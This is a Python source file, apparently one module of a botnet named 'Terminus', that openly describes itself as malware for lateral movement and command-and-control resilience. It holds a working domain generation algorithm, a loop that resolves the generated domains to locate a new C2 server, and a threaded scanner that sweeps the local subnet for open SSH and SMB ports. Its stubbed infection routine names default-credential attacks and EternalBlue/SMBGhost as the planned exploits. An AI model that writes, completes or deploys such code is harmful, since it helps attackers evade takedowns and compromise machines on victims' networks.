# file: apex_module.py
# version: 4.0.0 'leviathan'
# desc: lateral movement and cryptographic fallback. it hunts now.

import socket
import struct
import hashlib
import time
from datetime import datetime
import threading
import subprocess

# --- DGA (Domain Generation Algorithm) ---
def generate_dga_domains(seed_word, count=100):
    """generates daily domains. feds can't block them all."""
    domains = []
    today = datetime.utcnow().strftime("%Y%m%d")
    
    for i in range(count):
        # mix the seed, the date, and the iteration
        raw = f"{seed_word}_{today}_{i}".encode()
        hash_hex = hashlib.md5(raw).hexdigest()
        # use the first 12 chars + a random tld
        domain = f"{hash_hex[:12]}.{'xyz' if i % 2 == 0 else 'cc'}"
        domains.append(domain)
    return domains

def dga_fallback_loop():
    """if p2p is dead, try to resolve today's dga domains to find a new c2."""
    print("[apex] p2p isolated. initiating dga fallback...")
    while True:
        domains = generate_dga_domains("terminus_liberty", 50)
        for domain in domains:
            try:
                # if you registered this domain, the bot will find you
                ip = socket.gethostbyname(domain)
                print(f"[apex] dga resolved: {domain} -> {ip}. attempting bootstrap...")
                # conceptual: would trigger the bootstrap() function from the p2p seed here
                return ip
            except socket.gaierror:
                pass # domain not registered, move to the next
        time.sleep(3600) # wait an hour, try again

# --- LATERAL MOVEMENT (The Worm) ---
def get_local_subnet():
    """finds the local network range to hunt in."""
    # extremely simplified for demonstration. 
    # real malware parses routing tables.
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    
    parts = ip.split('.')
    return f"{parts[0]}.{parts[1]}.{parts[2]}."

def hunt_subnet():
    """scans the local network and attempts to spread."""
    subnet = get_local_subnet()
    if subnet.startswith("127."):
        return

    print(f"[apex] hunting on local subnet: {subnet}0/24")
    
    for i in range(1, 255):
        target_ip = f"{subnet}{i}"
        threading.Thread(target=attempt_infection, args=(target_ip,)).start()
        time.sleep(0.1) # throttle to avoid crashing local routers

def attempt_infection(ip):
    """attempts to break into a local neighbor."""
    # 1. check if port 22 (ssh) or 445 (smb) is open
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            if s.connect_ex((ip, 22)) == 0:
                # port 22 open. 
                # conceptual: in reality, it would use a dictionary of default creds (mirai style)
                # or an ssh exploit to drop the terminus payload.
                pass 
            elif s.connect_ex((ip, 445)) == 0:
                # port 445 open.
                # conceptual: launch eternalblue/smbghost exploit to execute payload.
                pass
    except Exception:
        pass

def start_apex_features():
    """to be called inside the TerminusCell start() method."""
    threading.Thread(target=hunt_subnet, daemon=True).start()
    # dga would be called only if peer list is 0 after a certain time